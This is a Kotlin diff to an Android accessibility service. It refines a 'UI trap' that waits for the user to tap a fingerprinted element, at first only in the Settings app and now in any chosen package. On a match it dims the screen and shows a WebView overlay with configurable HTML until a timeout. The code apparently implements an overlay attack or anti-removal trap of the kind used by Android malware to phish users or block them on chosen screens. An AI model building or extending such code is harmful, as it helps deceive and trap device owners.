@@ -472,70 +472,41 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- UNIVERSAL UI TRAP (Deep Scan Engine) ---
+        // --- UNIVERSAL UI TRAP (Tap-Only Engine) ---
         val statsPrefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
         if (statsPrefs.getBoolean("ui_trap_active", false)) {
-            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
-                event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED || 
-                event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
+            // STRICT REQUIREMENT: Only react to physical clicks
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
+                val pkg = event.packageName?.toString() ?: ""
                 
-                val now = System.currentTimeMillis()
-                val lastScan = statsPrefs.getLong("ui_trap_last_scan", 0L)
-                
-                // Throttle deep scans to max 2 per second to prevent CPU overload
-                if (now - lastScan > 500) {
-                    statsPrefs.edit().putLong("ui_trap_last_scan", now).apply()
-                    
-                    val targetData = statsPrefs.getString("ui_trap_target", "") ?: ""
-                    val pkg = event.packageName?.toString() ?: ""
-                    
-                    CoroutineScope(Dispatchers.IO).launch {
-                        val root = rootInActiveWindow
-                        val treeDump = serializeNode(root, 0, 10)
+                if (targetData.isNotEmpty()) {
+                    // Pass the EXACT node the user's finger touched to verify Structural Match
+                    if (verifyStructuralMatch(event.source, pkg, targetData)) {
+                        val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
+                        val html = statsPrefs.getString("ui_trap_html", "") ?: ""
+                        val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
                         
-                        // ALWAYS dump the full tree so the user can debug what Cortex actually sees
-                        DebugLogger.log("UI_TRAP_DUMP", "EVALUATING PKG: [$pkg] | TARGET: [$targetData] | EVENT: ${AccessibilityEvent.eventTypeToString(event.eventType)}")
-                        if (treeDump != null) {
-                            DebugLogger.log("UI_TRAP_DUMP", "FULL TREE:\n${treeDump.toString(2)}")
-                        } else {
-                            DebugLogger.log("UI_TRAP_DUMP", "FULL TREE: null (Screen might be secure or unreadable)")
+                        DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED ON TAP! Target: [$targetData]. Deploying trap sequence.")
+                        
+                        // Disable immediately to prevent duplicate triggers
+                        statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
+                        
+                        Handler(Looper.getMainLooper()).post {
+                            // 1. Dim to 20% brightness FIRST (Dimmer has FLAG_NOT_TOUCHABLE, it never swallows input)
+                            DimmerManager.applyDim(this@MyAccessibilityService, 20, method)
+                            
+                            // 2. Deploy WebView Overlay immediately AFTER dimming
+                            DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
                         }
                         
-                        if (targetData.isNotEmpty()) {
-                            // Extract just the primary title part to search anywhere on the screen
-                            val searchStr = targetData.split("@@")[0]
-                            val isMatch = findTextInside(root, searchStr)
-                            
-                            if (isMatch) {
-                                val method = statsPrefs.getString("ui_trap_method", "ACC") ?: "ACC"
-                                val html = statsPrefs.getString("ui_trap_html", "") ?: ""
-                                val timeout = statsPrefs.getLong("ui_trap_timeout", 10L)
-                                
-                                DebugLogger.log("UI_TRAP", "✅ FINGERPRINT MATCHED DEEP SCAN! Target: [$searchStr]. Deploying trap sequence.")
-                                
-                                // Disable immediately to prevent duplicate triggers
-                                statsPrefs.edit().putBoolean("ui_trap_active", false).apply()
-                                
-                                Handler(Looper.getMainLooper()).post {
-                                    // 1. Dim to 20% brightness FIRST (alpha = 0.8)
-                                    DimmerManager.applyDim(this@MyAccessibilityService, 20, method)
-                                    
-                                    // 2. Deploy WebView Overlay immediately AFTER dimming
-                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html)
-                                }
-                                
-                                // 3. Timeout Failsafe
-                                if (timeout > 0) {
-                                    Handler(Looper.getMainLooper()).postDelayed({
-                                        DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming trap and restoring display.")
-                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                        // Restore to 100% brightness (0% dim)
-                                        DimmerManager.applyDim(this@MyAccessibilityService, 100, method)
-                                    }, timeout * 1000)
-                                }
-                            } else {
-                                DebugLogger.log("UI_TRAP_VERBOSE", "❌ NO MATCH for [$searchStr] in current deep tree.")
-                            }
+                        // 3. Timeout Failsafe
+                        if (timeout > 0L) {
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming trap and restoring display.")
+                                DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                DimmerManager.applyDim(this@MyAccessibilityService, 100, method)
+                            }, timeout * 1000)
                         }
                     }
                 }
@@ -663,50 +634,53 @@ class MyAccessibilityService : AccessibilityService() {
     private fun verifyStructuralMatch(node: AccessibilityNodeInfo?, pkg: String, target: String): Boolean {
         if (node == null) return false
 
-        // 1. Setup Targets
+        // 1. Setup Targets (Format: TitleTarget@@SecondaryTarget@@Package)
         val parts = target.split("@@")
-        val titleTarget = parts[0]
-        val summaryTarget = parts.getOrNull(1)
+        val titleTarget = parts[0].trim()
+        val secondaryTarget = parts.getOrNull(1)?.trim()
+        val expectedPkg = parts.getOrNull(2)?.trim()
 
-        // 2. Package Security (Broadened for Samsung/Pixel)
-        if (!pkg.contains("settings", ignoreCase = true)) {
-            DebugLogger.log("UI_TRAP_REJECTED", "Package mismatch: $pkg")
+        // 2. Universal Package Security Check
+        if (!expectedPkg.isNullOrEmpty() && !pkg.contains(expectedPkg, ignoreCase = true)) {
+            DebugLogger.log("UI_TRAP_VERBOSE", "❌ Package mismatch. Expected: $expectedPkg, Got: $pkg")
             return false
         }
 
-        // 3. LOCAL SEARCH (Try finding text inside the clicked node first)
+        // 3. LOCAL SEARCH (Check the clicked node wrapper and its direct children)
         var hasTitle = findTextInside(node, titleTarget)
-        var hasSummary = if (summaryTarget != null) findTextInside(node, summaryTarget) else true
+        var hasSecondary = if (!secondaryTarget.isNullOrEmpty()) findTextInside(node, secondaryTarget) else true
 
-        // 4. INTERSECTION SNIPER (Fallback for Samsung empty containers)
-        if (!hasTitle) {
-            DebugLogger.log("UI_TRAP_VERBOSE", "Local search failed. Engaging Intersection Sniper...")
+        // 4. INTERSECTION SNIPER (Fallback for disconnected Accessibility Graphs)
+        if (!hasTitle || !hasSecondary) {
             val root = rootInActiveWindow
             val clickedBounds = android.graphics.Rect()
             node.getBoundsInScreen(clickedBounds)
 
-            // Find all instances of the text on the whole screen
-            val screenNodes = root?.findAccessibilityNodeInfosByText(titleTarget)
-            val sniperMatch = screenNodes?.any { screenNode ->
-                val textBounds = android.graphics.Rect()
-                screenNode.getBoundsInScreen(textBounds)
-                // Check if the text we found physically sits inside the box that was clicked
-                val intersects = android.graphics.Rect.intersects(clickedBounds, textBounds)
-                if (intersects) {
-                    DebugLogger.log("UI_TRAP_SNIPER", "Found [$titleTarget] at ${textBounds.toShortString()} which intersects click at ${clickedBounds.toShortString()}")
-                }
-                intersects
-            } ?: false
-            
-            if (sniperMatch) hasTitle = true
+            if (!hasTitle) {
+                val screenNodes = root?.findAccessibilityNodeInfosByText(titleTarget)
+                hasTitle = screenNodes?.any { screenNode ->
+                    val textBounds = android.graphics.Rect()
+                    screenNode.getBoundsInScreen(textBounds)
+                    android.graphics.Rect.intersects(clickedBounds, textBounds)
+                } ?: false
+            }
+
+            if (!hasSecondary && !secondaryTarget.isNullOrEmpty()) {
+                val screenNodes = root?.findAccessibilityNodeInfosByText(secondaryTarget)
+                hasSecondary = screenNodes?.any { screenNode ->
+                    val textBounds = android.graphics.Rect()
+                    screenNode.getBoundsInScreen(textBounds)
+                    android.graphics.Rect.intersects(clickedBounds, textBounds)
+                } ?: false
+            }
         }
 
-        if (hasTitle && hasSummary) {
-            DebugLogger.log("TRAP_MATCH", "Fingerprint Verified via Intersection. Title=[$titleTarget]")
+        if (hasTitle && hasSecondary) {
+            DebugLogger.log("TRAP_MATCH", "✅ Fingerprint Verified! Clicked node coordinates matched target: [$target]")
             return true
         }
 
-        DebugLogger.log("UI_TRAP_REJECTED", "Title [$titleTarget] not found in or under the click area.")
+        DebugLogger.log("UI_TRAP_VERBOSE", "❌ Fingerprint mismatch on clicked node. Expected: [$target]")
         return false
     }
 
